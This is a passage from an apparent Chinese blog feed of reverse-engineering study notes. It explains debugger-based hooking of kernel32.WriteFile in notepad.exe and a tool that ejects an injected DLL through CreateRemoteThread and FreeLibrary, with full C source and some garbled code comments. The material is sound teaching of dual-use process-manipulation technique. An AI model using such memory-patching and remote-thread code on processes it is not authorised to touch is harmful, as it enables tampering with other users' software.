fUnicode;</span><br><span class="line">&#125; CREATE_PROCESS_DEBUG_INFO, *LPCREATE_PROCESS_DEBUG_INFO;</span><br></pre></td></tr></table></figure><p>接着分析<code>OnCreateProcessDebugEvent</code></p><p>第5行将这些信息copy一份到<code>g_cpdi</code>中。</p><p>第7、8行完成的是读取进程代码中<code>Kernel32.WriteFIle</code> API指令代码的第一个字节。</p><blockquote><p>之所以可以这样操作是由于在系统中所有进程使用的都是同一份的<code>kernel32.dll</code>因此调试器<code>g_pfWriteFile = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;);</code>获取到的值对目标进程人就使用，指向的同为<code>Kernel32.WriteFile</code></p></blockquote><p>第9、10行完成的是在<code>Kernel32.WriteFile</code>的第一个字节写入中断指令<code>0xCC</code></p><p>分析到这里，我们就知道了，当<code>WaitForDebugEvent</code>监听到的调试事件是目标进程的<code>CREATE_PROCESS_DEBUG_EVENT</code>时，则在目标进程的<code>kernel32.WriteFile</code>读取头字节内容，并写入中断指令。执行完<code>CREATE_PROCESS_DEBUG_EVENT</code>的响应返回true。</p><p>执行<code>ContinueDebugEvent</code>准备下一个<code>DebugEvent</code>的发生</p><hr><h6 id="EXCEPTION-DEBUG-EVENT"><a href="#EXCEPTION-DEBUG-EVENT" class="headerlink" title="EXCEPTION_DEBUG_EVENT"></a>EXCEPTION_DEBUG_EVENT</h6><p>当目标进程触发<code>EXCEPTION_DEBUG_EVENT</code>调试事件，执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( OnExceptionDebugEvent(&amp;de) )</span><br><span class="line">                <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p><code>OnExceptionDebugEvent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">OnExceptionDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span><br><span class="line">&#123;</span><br><span class="line">   CONTEXT ctx;</span><br><span class="line">    PBYTE lpBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;</span><br><span class="line">    PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( g_pfWriteFile == per-&gt;ExceptionAddress )</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初步可见是判断当前的异常事件<code>EXCEPTION_DEBUG_EVENT</code>是否是断点异常<code>EXCEPTION_BREAKPOINT</code></p><p>不是则<code>return FALSE</code>回到<code>DebugLoop</code>接着监听下一个<code>DebugEvent</code>，之所以如此是由于我们的目标是<code>kernel32.WriteFile</code>这一点我们在<code>DebugEvent = CREATE_PROCESS_DEBUG_EVENT</code>的响应时间中设置了目标API第一字节为断点异常<code>EXCEPTION_BREAKPOINT</code>了.</p><p>当异常事件是断点异常<code>EXCEPTION_BREAKPOINT</code>并且确实是我们设置好的位置<code>g_pfWriteFile == per-&gt;ExceptionAddress</code>时执行if为true的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( g_pfWriteFile == per-&gt;ExceptionAddress )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// #1. Unhook</span></span><br><span class="line">            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                               &amp;g_chOrgByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #2. Thread Context</span></span><br><span class="line">            ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">            GetThreadContext(g_cpdi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #3. WriteFile() 参数</span></span><br><span class="line">            <span class="comment">//   param 2 : ESP + 0x8</span></span><br><span class="line">            <span class="comment">//   param 3 : ESP + 0xC</span></span><br><span class="line">            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0x8</span>), </span><br><span class="line">                              &amp;dwAddrOfBuffer, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</span><br><span class="line">            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0xC</span>), </span><br><span class="line">                              &amp;dwNumOfBytesToWrite, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #4. ÀÓ½Ã ¹öÆÛ ÇÒ´ç</span></span><br><span class="line">            lpBuffer = (PBYTE)<span class="built_in">malloc</span>(dwNumOfBytesToWrite+<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">memset</span>(lpBuffer, <span class="number">0</span>, dwNumOfBytesToWrite+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #5. WriteFile() ÀÇ ¹öÆÛ¸¦ ÀÓ½Ã ¹öÆÛ¿¡ º¹»ç</span></span><br><span class="line">            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, </span><br><span class="line">                              lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n### original string ###\n%s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #6. ¼Ò¹®ÀÚ -&gt; ´ë¹®ÀÚ º¯È¯</span></span><br><span class="line">            <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; dwNumOfBytesToWrite; i++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>( <span class="number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="number">0x7A</span> )</span><br><span class="line">                    lpBuffer[i] -= <span class="number">0x20</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n### converted string ###\n%s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #7. º¯È¯µÈ ¹öÆÛ¸¦ WriteFile() ¹öÆÛ·Î º¹»ç</span></span><br><span class="line">            WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, </span><br><span class="line">                               lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// #8. ÀÓ½Ã ¹öÆÛ ÇØÁ¦</span></span><br><span class="line">            <span class="built_in">free</span>(lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #9. Thread Context ÀÇ EIP ¸¦ WriteFile() ½ÃÀÛÀ¸·Î º¯°æ</span></span><br><span class="line">            <span class="comment">//   (ÇöÀç´Â WriteFile() + 1 ¸¸Å­ Áö³ª¿ÔÀ½)</span></span><br><span class="line">            ctx.Eip = (DWORD)g_pfWriteFile;</span><br><span class="line">            SetThreadContext(g_cpdi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #10. Debuggee ÇÁ·Î¼¼½º¸¦ ÁøÇà½ÃÅ´</span></span><br><span class="line">            ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);</span><br><span class="line">            Sleep(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #11. API Hook</span></span><br><span class="line">            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                               &amp;g_chINT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br></pre></td></tr></table></figure><ul><li><p>第4、5行完成的是进行UnHook—恢复先前被Hook的API<code>Kernel32.WriteFile</code>的第一个字节（<code>g_chOrgByte</code>）否则会陷入hook循环</p></li><li><p>第8行设置<code>context.ContextFlags = CONTEXT_CONTROL</code>表明想查看的CONTEXT内容是控制寄存器组</p></li><li><p>第9行，按照设置的CONTEXT.ContextFlags进行执行上文信息的获取，获取的内容存放在<code>ctx</code>中</p></li><li><p>后面的代码是最能体现hook的意图的了。这里先查看下函数原型：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">WriteFile</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]                HANDLE       hFile,</span></span><br><span class="line"><span class="params">  [in]                LPCVOID      lpBuffer,</span></span><br><span class="line"><span class="params">  [in]                DWORD        nNumberOfBytesToWrite,</span></span><br><span class="line"><span class="params">  [out, optional]     LPDWORD      lpNumberOfBytesWritten,</span></span><br><span class="line"><span class="params">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>  第14-17行代码，根据ESP来索引APi的参数，读取了调用<code>kernel32.WriteFile</code>的第二个参数（ESP+8）写入的目的地<code>lpBuffer</code>，第三额参数，写入的字节数<code>nNumberOfBytesToWrite</code>。可以猜到后续应该是<strong>修改这两个值，使得写入的位置，写入的长度发生变化，这就是Hook Function的行为</strong></p></li><li><p>第20、21行，可以看到申请了一块大小和上边取出的<code>kernel32.WriteFile</code>大小相同的缓冲区<code>lpBuffer</code>（开始要搞事了），并使用0填充</p></li><li><p>第24-26行，读取出原<code>kernel32.WriteFile</code>要写入的内容，存放到<code>lpBuffer</code>，并进行打印</p></li><li><p>第29-33行，将<code>lpBuffer</code>中的小写字符转为大写</p></li><li><p>第38、39行，将转化后的字符写入<code>kernel32.WriteFile</code>的参数</p></li><li><p>第46行，设置ctx.eip，执行正常API<code>kernel32.WriteFile</code>调用，因为第一个字节内容被恢复了。</p></li><li><p>第47行，设置线程执行上下文环境为ctx</p></li><li><p>第50、51行，恢复线程运行，</p></li><li><p>第54行，重新对<code>kernel32.WriteFile</code>下hook，以便下次在此拦截API调用。</p></li><li><p>return True</p></li></ul><p>随后回到DebugLoop继续监听调试事件的发生</p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><ul><li><p><code>DebugActiveProcess</code>设置目标进程为可调试状态</p></li><li><p>启用<code>DebugLoop</code></p><ul><li><p><code>DebugLoop.WaitForDebugEvent</code>监听目标进程触发的调试事件</p><ul><li><p>当调试事件&#x3D;<code>CREATE_PROCESS_DEBUG_EVENT</code>，进程创建标志触发，判断是目标后<code>OnCreateProcessDebugEvent</code>响应调试事件，<strong>下钩时机</strong>在<code>OnCreateProcessDebugEvent</code>内部，下钩步骤如下：</p><ol><li>保存即将要Hook的API的第一个字节的内容。</li><li>修改第一个字节内容为<code>断点异常0xCC</code>，完成下钩</li></ol></li><li><p>当调试事件&#x3D;<code>EXCEPTION_DEBUG_EVENT</code>，判定是目标出发的调试事件后<code>OnExceptionDebugEvent</code>响应，<strong>钩子函数作用时机</strong>在<code>OnExceptionDebugEvent</code>内部，若想重复钩取，则需要在钩子函数的最后重新下钩。</p></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.8--DLL卸载</title>
      <link href="/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-8-DLL%E5%8D%B8%E8%BD%BD/"/>
      <url>/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-8-DLL%E5%8D%B8%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h3 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h3><blockquote><p>DLL卸载是将强制插入进程的DLL弹出的一种技术，其基本原理用CreateRemoteThread API进行DLL注入的原理类似，区别是DLL注入时CreateRemoteThread 的回调函数是LoadLibrary API 而DLL卸载CreateRemoteThread 的回调函数是FreeLibrary</p><p>参考书：《逆向工程核心原理》</p></blockquote><h3 id="源码行为剖析"><a href="#源码行为剖析" class="headerlink" title="源码行为剖析"></a>源码行为剖析</h3><h4 id="EjectDll-gt-main"><a href="#EjectDll-gt-main" class="headerlink" title="EjectDll -&gt; main"></a>EjectDll -&gt; main</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EjectDll.exe</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROC_NAME(<span class="string">L&quot;notepad.exe&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DLL_NAME(<span class="string">L&quot;myhack.dll&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// find process</span></span><br><span class="line">    dwPID = <span class="built_in">FindProcessID</span>(DEF_PROC_NAME);<span class="comment">//看起始第十行代码，完成的功能是找到notepad.exe的pid</span></span><br><span class="line">    <span class="keyword">if</span>( dwPID == <span class="number">0xFFFFFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;There is no &lt;%s&gt; process!\n&quot;</span>, DEF_PROC_NAME);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _tprintf(<span class="string">L&quot;PID of \&quot;%s\&quot; is %d\n&quot;</span>, DEF_PROC_NAME, dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">SetPrivilege</span>(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// eject dll</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">EjectDll</span>(dwPID, DEF_DLL_NAME) )<span class="comment">//No.88代码</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;EjectDll(%d, \&quot;%s\&quot;) success!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;EjectDll(%d, \&quot;%s\&quot;) failed!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="main-gt-FindProcessID"><a href="#main-gt-FindProcessID" class="headerlink" title="main -&gt; FindProcessID"></a>main -&gt; FindProcessID</h4><p>main函数先是使用 API FindProcessID找到目标进程的pid，找到了对进程名称于pid进行输出，FindProcessID是在EjectDLL.exe源码中定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">FindProcessID</span><span class="params">(LPCTSTR szProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    HANDLE hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the snapshot of the system</span></span><br><span class="line">    pe.dwSize = <span class="built_in">sizeof</span>( PROCESSENTRY32 );</span><br><span class="line">    hSnapShot = <span class="built_in">CreateToolhelp32Snapshot</span>( TH32CS_SNAPALL, <span class="literal">NULL</span> );<span class="comment">//第一个参数有规定，这里创造的快照是所有系统中的进程，返回值是一个handle类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// find process</span></span><br><span class="line">    <span class="built_in">Process32First</span>(hSnapShot, &amp;pe);<span class="comment">//取得快照中的第一项PROCESSENTRY32结构体</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//比对第一个PROCESSENTRY32.szExeFile，该项是当前exe文件的名称，这里比对的事main函数传递进来的参数：notepad.exe</span></span><br><span class="line">        <span class="keyword">if</span>(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))</span><br><span class="line">        &#123;</span><br><span class="line">            dwPID = pe.th32ProcessID;<span class="comment">//比对成功则将dwPID设置为当前的进程</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">Process32Next</span>(hSnapShot, &amp;pe));<span class="comment">//循环比对</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapShot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwPID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在FindProcessID内部会使用APi CreateToolhelp32Snapshot返回系统中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwFlags,<span class="comment">//The portions of the system to be included in the snapshot. </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD th32ProcessID<span class="comment">//The process identifier of the process to be included in the snapshot. This parameter can be zero to indicate the current process.</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>TH32CS_SNAPALL</strong></td><td align="left">Includes all processes and threads in the system, plus the heaps and modules of the process specified in <em>th32ProcessID</em>. Equivalent to specifying the <strong>TH32CS_SNAPHEAPLIST</strong>,<strong>TH32CS_SNAPMODULE</strong>, <strong>TH32CS_SNAPPROCESS</strong>, and<strong>TH32CS_SNAPTHREAD</strong> values combined using an OR operation (‘|’).</td></tr></tbody></table><p>CreateToolhelp32Snapshot会返回获取到的进程快照对应的句柄</p><p>接着使用Process32First &amp; Process32Next遍历CreateToolhelp32Snapshot得到进程快照内容，依次赋给<code>PROCESSENTRY32 pe</code>，接下来从pe中获取当前的进程快照块中名称是否为目标进程“notepad.exe”，PROCESSENTRY32结构体原型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagPROCESSENTRY32</span> &#123;</span><br><span class="line">  DWORD     dwSize;</span><br><span class="line">  DWORD     cntUsage;</span><br><span class="line">  DWORD     th32ProcessID;</span><br><span class="line">  ULONG_PTR th32DefaultHeapID;</span><br><span class="line">  DWORD     th32ModuleID;</span><br><span class="line">  DWORD     cntThreads;</span><br><span class="line">  DWORD     th32ParentProcessID;</span><br><span class="line">  LONG      pcPriClassBase;</span><br><span class="line">  DWORD     dwFlags;</span><br><span class="line">  CHAR      szExeFile[MAX_PATH];<span class="comment">//当前进程名称</span></span><br><span class="line">&#125; PROCESSENTRY32;</span><br></pre></td></tr></table></figure><p>若配对成功说明当前进程快照块是目标进程notepad.exe，则取他的<code>dwPID = pe.th32ProcessID</code>进行FindProcessID return</p><hr><h4 id="main-gt-SetPrivilege"><a href="#main-gt-SetPrivilege" class="headerlink" title="main -&gt; SetPrivilege"></a>main -&gt; SetPrivilege</h4><p>回到main函数内部，会执行权限提升（后续操作需要）,<code>SetPrivilege(SE_DEBUG_NAME, TRUE)</code>，后续在补充，这里只需要先记住经过系统权限调整使得后续从目标进程弹出DLL的操作满足权限要求即可。</p><hr><h4 id="main-gt-EjectDll"><a href="#main-gt-EjectDll" class="headerlink" title="main -&gt; EjectDll"></a>main -&gt; EjectDll</h4><p>随后进行关键的DLL弹出函数<code>EjectDll(dwPID, DEF_DLL_NAME)</code>，参数是目标进程对应的PID，以及即将从目标进程中卸载的dll名称</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span><span class="comment">//待操作的进程以及将要卸载的dll</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bMore = FALSE, bFound = FALSE;</span><br><span class="line">    HANDLE hSnapshot, hProcess, hThread;</span><br><span class="line">    HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">    MODULEENTRY32 me = &#123; <span class="built_in">sizeof</span>(me) &#125;;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dwPID = notepad.exe Process ID</span></span><br><span class="line">    <span class="comment">// TH32CS_SNAPMODULE</span></span><br><span class="line">    hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, dwPID);<span class="comment">//快照dwPID进程载入的模块</span></span><br><span class="line"></span><br><span class="line">    bMore = <span class="built_in">Module32First</span>(hSnapshot, &amp;me);</span><br><span class="line">    <span class="keyword">for</span>( ; bMore ; bMore = <span class="built_in">Module32Next</span>(hSnapshot, &amp;me) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//比对载入的dll名称以及路径是否一致，锁定myhack.dll</span></span><br><span class="line">        <span class="keyword">if</span>( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || </span><br><span class="line">            !_tcsicmp((LPCTSTR)me.szExePath, szDllName) )</span><br><span class="line">        &#123;</span><br><span class="line">            bFound = TRUE;<span class="comment">//匹配到了设置标志位bFound为true</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !bFound )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hSnapshot);<span class="comment">//匹配myhack.dll失败</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//寻找kernel32.dll.FreeLibrary API的地址，为卸载dll调用作准备</span></span><br><span class="line">    hModule = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line">    <span class="comment">//在notepad.exe进程中开启线程，设置回调函数调用FreeLibrary API进行dll卸载</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">                                 pThreadProc, me.modBaseAddr, </span><br><span class="line">                                 <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先调用CreateToolhelp32Snapshot API，在前面的分析也调用过，该API描述如下：</p><blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD th32ProcessID</span></span></span><br><span class="line"><span class="params"><span 